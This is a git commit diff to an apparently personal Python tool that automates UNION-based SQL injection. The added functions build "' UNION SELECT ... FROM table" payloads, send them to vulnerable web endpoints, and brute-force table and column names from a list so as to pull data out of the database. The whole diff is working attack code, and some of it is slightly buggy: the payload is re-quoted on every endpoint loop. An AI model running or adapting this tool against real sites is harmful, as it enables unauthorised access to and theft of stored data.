d7671f9c67bedcbfc264f90bb2dce342b8f92412
s0m3body <pisdushko1886@gmail.com>
2024-12-30 14:51:17 +0300

    Changes: 1) Changes union_sqli.py file, the verify_table_column function now    properly checks whether column/table exists in the database. 2) craft_exfil_pld function is dynamic and will add either column or    NULL, with or without comma depending whether column can hold string

--- SQLi/src/SQLi/union_sqli.py
+++ SQLi/src/SQLi/union_sqli.py
@@ -8,42 +8,71 @@ from bs4 import BeautifulSoup
 from utils.auxiliary import *
 from utils.files import *
 
+
 log = Auxiliary(__name__)
 log.set_config()
 
 
+def craft_exfil_pld(table, column, options: list):
+    db_comment, str_index = options[1], options[3]
+    scraped = False
+    # Defining the beginning of the payload
+    pld = "' UNION SELECT"
+    # Traversing indexes that can contain string
+    for index in str_index:
+        # If we hit column that can handle string
+        if str_index[index - 1] == index:
+            # Checking if the current index is the first one or not
+            # If it is, adding column, otherwise adding NULL
+            # Scraped variable to not send same columns
+            if index == 1:
+                pld += f" {column}"
+                scraped = True
+            else:
+                if scraped:
+                    pld += ", NULL"
+                else:
+                    pld += f", {column}"
+        # If we hit column that cannot take string, we add NULL
+        else:
+            if index == 1:
+                pld += "NULL"
+            else:
+                pld += ", NULL"
+    pld += f" FROM {table}{db_comment}"
+    return pld
+
+
 def verify_table_column(url, table, column, options: list):
     exists = False
-    vuln_endpoints, db_comment, num_cols = options[0], options[1], options[2]
-    columns = ', '.join([column] * num_cols)
-    pld = f"' UNION SELECT {columns} FROM {table}{db_comment}"
+    vuln_endpoints = options[0]
+    pld = craft_exfil_pld(table, column, options)
+    print(f"Payload = {pld}")
     for endp in vuln_endpoints:
+        pld = requests.utils.quote(pld)
         r = requests.get(url=url + endp + pld)
+        log.logger.info(f"{BLUE}[*]{RESET} Trying to verify whether column +{column}+ "
+                        f"exists in table +{table}+ on endpoint {url + endp + pld}")
         if r.status_code == 200:
-            log.logger.info(f"{GREEN}[+]{RESET} Column {column} "
-                            f"exists in table {table}, appending it")
+            log.logger.info(f"{GREEN}[+]{RESET} Column +{column}+ "
+                            f"exists in table +{table}+, appending it")
             exists = True
     return exists
 
 
-def guess_table_column(url, options: list):
+def guess_table_columns(url, options: list):
+    vuln_endpoints, db_comment, num_cols, str_index = options[0], options[1], \
+        options[2], options[3]
     valid_table_column = [[], []]
     tables_json = File("tables.json")
     data = json.load(tables_json.file)
-    # We are traversing tables here
+    # We are checking whether tables and columns from tables.json are valid
     for table in data:
         for column in data[table]:
             if verify_table_column(url, table, column, options):
                 if table not in valid_table_column[0]:
                     valid_table_column[0].append(table)
                 valid_table_column[1].append(column)
-                # print(valid_table_column)
-
-            # for index in range(0, num_cols):
-            #     # We add +1 because str_index starts with 0
-            #     if str_index[index] == index + 1:
-            #         pld = verify_column(column, db_comment, num_cols)
-            #         print(pld)
 
 
 def try_data_exfil(url, options: list):
@@ -52,13 +81,14 @@ def try_data_exfil(url, options: list):
         pass
         # try_concat()
     else:
-        guess_table_column(url, options)
+        guess_table_columns(url, options)
 
 
 def swap_null_w_str(pld, text_str, index, options: list):
     db_comment, num_cols = options[1], options[2]
-    # Stripping NULL--, adding our text string
-    str_pld = f"{pld[:-6]}'{text_str}'" + \
+    # Stripping NULL and db_comment , adding our text string
+    size_to_strip = -(4 + len(db_comment))
+    str_pld = f"{pld[:size_to_strip]}'{text_str}'" + \
         ", NULL" * (num_cols - index) + db_comment
     return str_pld
 
@@ -82,6 +112,7 @@ def find_text_cols(url, options: list):
     vuln_endpoints, db_comment, num_cols = options[0], options[1], options[2]
     text_str = find_string_to_reflect(url)
     for endp in vuln_endpoints:
+        # It is easier to start from index 1
         for index in range(1, int(num_cols) + 1):
             pld = generate_null_pld(db_comment, index)
             pld = swap_null_w_str(pld, text_str, index, options)
